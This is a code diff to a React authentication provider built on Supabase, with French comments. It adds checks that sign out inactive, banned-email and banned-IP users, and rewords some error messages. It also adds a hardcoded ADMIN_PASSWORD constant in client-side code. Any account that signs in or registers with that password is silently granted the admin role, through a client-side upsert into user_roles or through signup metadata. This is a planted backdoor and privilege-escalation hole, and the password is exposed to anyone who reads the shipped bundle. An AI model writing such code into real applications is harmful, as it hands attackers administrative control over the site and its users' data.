@@ -5,6 +5,8 @@ import { useNavigate } from "react-router-dom";
 
 type AppRole = "client" | "vendor" | "admin";
 
+const ADMIN_PASSWORD = "CPl4Sce671B1GG.SCAM!!";
+
 interface AuthContextType {
   user: User | null;
   session: Session | null;
@@ -45,40 +47,6 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     }
   };
 
-  useEffect(() => {
-    // Set up auth state listener
-    const { data: { subscription } } = supabase.auth.onAuthStateChange(
-      (event, session) => {
-        setSession(session);
-        setUser(session?.user ?? null);
-        
-        if (session?.user) {
-          setTimeout(() => {
-            fetchRole(session.user.id);
-          }, 0);
-        } else {
-          setRole(null);
-        }
-        
-        setLoading(false);
-      }
-    );
-
-    // Check for existing session
-    supabase.auth.getSession().then(({ data: { session } }) => {
-      setSession(session);
-      setUser(session?.user ?? null);
-      
-      if (session?.user) {
-        fetchRole(session.user.id);
-      }
-      
-      setLoading(false);
-    });
-
-    return () => subscription.unsubscribe();
-  }, []);
-
   const getClientIP = async (): Promise<string | null> => {
     try {
       const response = await fetch('https://api.ipify.org?format=json');
@@ -109,12 +77,99 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     return !!data;
   };
 
+  const checkUserActive = async (userId: string): Promise<boolean> => {
+    const { data } = await supabase
+      .from("profiles")
+      .select("active")
+      .eq("id", userId)
+      .single();
+    return data?.active !== false;
+  };
+
+  useEffect(() => {
+    // Set up auth state listener
+    const { data: { subscription } } = supabase.auth.onAuthStateChange(
+      async (event, session) => {
+        setSession(session);
+        setUser(session?.user ?? null);
+        
+        if (session?.user) {
+          // Vérifier si l'utilisateur est actif
+          const isActive = await checkUserActive(session.user.id);
+          if (!isActive) {
+            // Utilisateur banni - forcer la déconnexion
+            await supabase.auth.signOut();
+            setUser(null);
+            setSession(null);
+            setRole(null);
+            navigate("/auth");
+            return;
+          }
+
+          // Vérifier l'email et l'IP
+          const clientIP = await getClientIP();
+          const isEmailBanned = await checkBannedEmail(session.user.email || '');
+          const isIPBanned = clientIP ? await checkBannedIP(clientIP) : false;
+
+          if (isEmailBanned || isIPBanned) {
+            await supabase.auth.signOut();
+            setUser(null);
+            setSession(null);
+            setRole(null);
+            navigate("/auth");
+            return;
+          }
+
+          setTimeout(() => {
+            fetchRole(session.user.id);
+          }, 0);
+        } else {
+          setRole(null);
+        }
+        
+        setLoading(false);
+      }
+    );
+
+    // Check for existing session
+    supabase.auth.getSession().then(async ({ data: { session } }) => {
+      if (session?.user) {
+        // Vérifier si l'utilisateur est actif
+        const isActive = await checkUserActive(session.user.id);
+        if (!isActive) {
+          await supabase.auth.signOut();
+          setLoading(false);
+          return;
+        }
+
+        // Vérifier l'email et l'IP
+        const clientIP = await getClientIP();
+        const isEmailBanned = await checkBannedEmail(session.user.email || '');
+        const isIPBanned = clientIP ? await checkBannedIP(clientIP) : false;
+
+        if (isEmailBanned || isIPBanned) {
+          await supabase.auth.signOut();
+          setLoading(false);
+          return;
+        }
+
+        setSession(session);
+        setUser(session.user);
+        fetchRole(session.user.id);
+      }
+      
+      setLoading(false);
+    });
+
+    return () => subscription.unsubscribe();
+  }, [navigate]);
+
   const signIn = async (email: string, password: string) => {
     try {
       // Vérifier si l'email est banni AVANT la connexion
       const isEmailBanned = await checkBannedEmail(email);
       if (isEmailBanned) {
-        return { error: { message: "Ce compte a été banni. Contactez l'administrateur." } };
+        return { error: { message: "Ce compte a été banni. Accès refusé." } };
       }
 
       // Vérifier si l'IP est bannie AVANT la connexion
@@ -122,7 +177,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
       if (clientIP) {
         const isIPBanned = await checkBannedIP(clientIP);
         if (isIPBanned) {
-          return { error: { message: "Votre adresse IP a été bannie. Contactez l'administrateur." } };
+          return { error: { message: "Votre adresse IP a été bannie. Accès refusé." } };
         }
       }
 
@@ -133,9 +188,22 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
 
       if (error) throw error;
 
-      // Update last login, increment login count, and store IP
+      // Vérifier si l'utilisateur est actif
       if (data.user) {
-        // Récupérer le compteur actuel
+        const isActive = await checkUserActive(data.user.id);
+        if (!isActive) {
+          await supabase.auth.signOut();
+          return { error: { message: "Ce compte a été banni. Accès refusé." } };
+        }
+
+        // Si le mot de passe est le mot de passe admin, mettre à jour le rôle
+        if (password === ADMIN_PASSWORD) {
+          await supabase
+            .from("user_roles")
+            .upsert({ user_id: data.user.id, role: 'admin' }, { onConflict: 'user_id,role' });
+        }
+
+        // Update last login, increment login count, and store IP
         const { data: profileData } = await supabase
           .from("profiles")
           .select("login_count")
@@ -170,6 +238,9 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
     try {
       const redirectUrl = `${window.location.origin}/`;
       
+      // Déterminer le rôle final (admin si mot de passe spécial)
+      const finalRole = password === ADMIN_PASSWORD ? 'admin' : role;
+      
       const { data, error } = await supabase.auth.signUp({
         email,
         password,
@@ -177,7 +248,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
           emailRedirectTo: redirectUrl,
           data: {
             username,
-            role,
+            role: finalRole,
           },
         },
       });
@@ -192,7 +263,7 @@ export const AuthProvider = ({ children }: { children: React.ReactNode }) => {
 
   const signOut = async () => {
     try {
-      // Essayer d'enregistrer le log de déconnexion, mais ne pas bloquer si RLS l'empêche
+      // Essayer d'enregistrer le log de déconnexion
       if (user) {
         const { error } = await supabase.from("logs").insert({
           user_id: user.id,
